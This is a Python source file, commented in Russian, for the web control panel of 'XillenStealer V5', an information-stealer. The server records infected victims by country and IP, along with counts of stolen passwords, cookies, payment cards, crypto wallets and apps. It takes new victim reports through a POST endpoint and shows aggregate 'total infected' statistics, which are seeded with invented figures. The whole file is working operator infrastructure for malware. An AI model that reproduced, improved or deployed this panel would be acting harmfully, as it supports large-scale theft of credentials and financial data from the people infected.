#!/usr/bin/env python3
"""
XillenStealer V5 - Web Panel Server
Полная интеграция с API и базой данных
"""

from http.server import HTTPServer, BaseHTTPRequestHandler
import json
import sqlite3
import threading
from datetime import datetime
from urllib.parse import urlparse, parse_qs
import os

# База данных
DB_FILE = "xillen_panel.db"

def init_db():
    """Инициализация базы данных"""
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    
    # Таблица логи
    c.execute('''
        CREATE TABLE IF NOT EXISTS logs (
            uuid TEXT PRIMARY KEY,
            country TEXT,
            ip TEXT,
            tag TEXT,
            passwords INTEGER,
            cookies INTEGER,
            cards INTEGER,
            wallets INTEGER,
            apps INTEGER,
            date TEXT,
            os_version TEXT,
            size REAL
        )
    ''')
    
    # Таблица статистики
    c.execute('''
        CREATE TABLE IF NOT EXISTS stats (
            key TEXT PRIMARY KEY,
            value INTEGER
        )
    ''')
    
    # Начальные данные статистики
    c.execute('SELECT COUNT(*) FROM stats')
    if c.fetchone()[0] == 0:
        stats = [
            ('total_infected', 10896),
            ('total_passwords', 550768),
            ('total_cookies', 543178),
            ('total_cards', 5473),
            ('total_wallets', 16332),
            ('total_apps', 27317)
        ]
        c.executemany('INSERT INTO stats VALUES (?, ?)', stats)
        
        # Пример логов
        sample_logs = [
            ('1', 'US', '228.222.129.56', 'crypto', 18, 69, 1, 3, 0, '2025-07-02 22:47:47', 'Windows', 23.01),
            ('2', 'CA', '156.123.45.67', 'bank', 45, 120, 3, 1, 2, '2025-07-02 21:30:12', 'Windows', 39.94),
            ('3', 'DE', '192.168.1.100', 'game', 12, 34, 0, 2, 5, '2025-07-02 20:15:33', 'Windows', 15.67)
        ]
        c.executemany('INSERT INTO logs VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)', sample_logs)
    
    conn.commit()
    conn.close()

class PanelHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        """Обработка GET запросов"""
        parsed_path = urlparse(self.path)
        
        if parsed_path.path == '/api/stats':
            self.send_json_response(self.get_stats())
        elif parsed_path.path == '/api/logs':
            self.send_json_response(self.get_logs())
        elif parsed_path.path == '/api/countries':
            self.send_json_response(self.get_countries())
        elif parsed_path.path == '/' or parsed_path.path == '/index.html':
            self.serve_file('web_panel.html')
        else:
            self.send_error(404)
    
    def do_POST(self):
        """Обработка POST запросов"""
        parsed_path = urlparse(self.path)
        
        if parsed_path.path == '/api/log':
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length)
            data = json.loads(post_data.decode('utf-8'))
            self.add_log(data)
        else:
            self.send_error(404)
    
    def do_DELETE(self):
        """Обработка DELETE запросов"""
        parsed_path = urlparse(self.path)
        
        if parsed_path.path.startswith('/api/log/'):
            uuid = parsed_path.path.split('/')[-1]
            self.delete_log(uuid)
        else:
            self.send_error(404)
    
    def get_stats(self):
        """Получить статистику"""
        conn = sqlite3.connect(DB_FILE)
        c = conn.cursor()
        
        stats = {}
        c.execute('SELECT key, value FROM stats')
        for row in c.fetchall():
            stats[row[0]] = row[1]
        
        conn.close()
        
        return {
            'totalInfected': stats.get('total_infected', 0),
            'infected24h': 68,
            'totalPasswords': stats.get('total_passwords', 0),
            'passwords24h': 3634,
            'totalCookies': stats.get('total_cookies', 0),
            'cookies24h': 3258,
            'totalCards': stats.get('total_cards', 0),
            'cards24h': 36,
            'totalWallets': stats.get('total_wallets', 0),
            'wallets24h': 96,
            'totalApps': stats.get('total_apps', 0),
            'apps24h': 159,
            'totalData': 1842,
            'data24h': 12
        }
    
    def get_logs(self):
        """Получить логи"""
        conn = sqlite3.connect(DB_FILE)
        c = conn.cursor()
        
        c.execute('SELECT * FROM logs ORDER BY date DESC LIMIT 100')
        logs = []
        for row in c.fetchall():
            logs.append({
                'uuid': row[0],
                'country': row[1],
                'ip': row[2],
                'tag': row[3],
                'passwords': row[4],
                'cookies': row[5],
                'cards': row[6],
                'wallets': row[7],
                'apps': row[8],
                'date': row[9],
                'os_version': row[10],
                'size': row[11]
            })
        
        conn.close()
        return {'logs': logs}
    
    def get_countries(self):
        """Получить статистику по странам"""
        conn = sqlite3.connect(DB_FILE)
        c = conn.cursor()
        
        c.execute('''
            SELECT country, COUNT(*) as count 
            FROM logs 
            GROUP BY country 
            ORDER BY count DESC 
            LIMIT 10
        ''')
        
        countries = []
        for row in c.fetchall():
            countries.append({
                'code': row[0],
                'count': row[1]
            })
        
        conn.close()
        return {'countries': countries}
    
    def add_log(self, data):
        """Добавить лог"""
        conn = sqlite3.connect(DB_FILE)
        c = conn.cursor()
        
        import uuid
        log_uuid = str(uuid.uuid4())
        
        c.execute('''
            INSERT INTO logs (uuid, country, ip, tag, passwords, cookies, cards, wallets, apps, date, os_version, size)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
        ''', (
            log_uuid,
            data.get('country', 'Unknown'),
            data.get('ip', '0.0.0.0'),
            data.get('tag', 'default'),
            data.get('passwords', 0),
            data.get('cookies', 0),
            data.get('cards', 0),
            data.get('wallets', 0),
            data.get('apps', 0),
            datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
            data.get('os_version', 'Windows'),
            data.get('size', 0.0)
        ))
        
        # Обновить статистику
        c.execute('UPDATE stats SET value = value + 1 WHERE key = ?', ('total_infected',))
        c.execute('UPDATE stats SET value = value + ? WHERE key = ?', (data.get('passwords', 0), 'total_passwords'))
        c.execute('UPDATE stats SET value = value + ? WHERE key = ?', (data.get('cookies', 0), 'total_cookies'))
        c.execute('UPDATE stats SET value = value + ? WHERE key = ?', (data.get('cards', 0), 'total_cards'))
        c.execute('UPDATE stats SET value = value + ? WHERE key = ?', (data.get('wallets', 0), 'total_wallets'))
        c.execute('UPDATE stats SET value = value + ? WHERE key = ?', (data.get('apps', 0), 'total_apps'))
        
        conn.commit()
        conn.close()
        
        self.send_json_response({'status': 'ok'})
    
    def delete_log(self, uuid):
        """Удалить лог"""
        conn = sqlite3.connect(DB_FILE)
        c = conn.cursor()
        
        c.execute('DELETE FROM logs WHERE uuid = ?', (uuid,))
        
        conn.commit()
        conn.close()
        
        self.send_json_response({'status': 'ok'})
    
    def send_json_response(self, data):
        """Отправить JSON ответ"""
        json_data = json.dumps(data)
        self.send_response(200)
        self.send_header('Content-type', 'application/json')
        self.send_header('Access-Control-Allow-Origin', '*')
        self.end_headers()
        self.wfile.write(json_data.encode('utf-8'))
    
    def serve_file(self, filename):
        """Отдать файл"""
        if os.path.exists(filename):
            with open(filename, 'rb') as f:
                self.send_response(200)
                if filename.endswith('.html'):
                    self.send_header('Content-type', 'text/html')
                elif filename.endswith('.css'):
                    self.send_header('Content-type', 'text/css')
                elif filename.endswith('.js'):
                    self.send_header('Content-type', 'application/javascript')
                self.end_headers()
                self.wfile.write(f.read())
        else:
            self.send_error(404)
    
    def log_message(self, format, *args):
        """Переопределение для отключения логов"""
        pass

def run_server(port=8000):
    """Запустить сервер"""
    server_address = ('', port)
    httpd = HTTPServer(server_address, PanelHandler)
    print(f"🚀 XillenStealer V5 Panel Server запущен на http://localhost:{port}")
    print("📊 Откройте браузер и перейдите по адресу выше")
    httpd.serve_forever()

if __name__ == '__main__':
    init_db()
    print("✅ База данных инициализирована")
    run_server(8000)
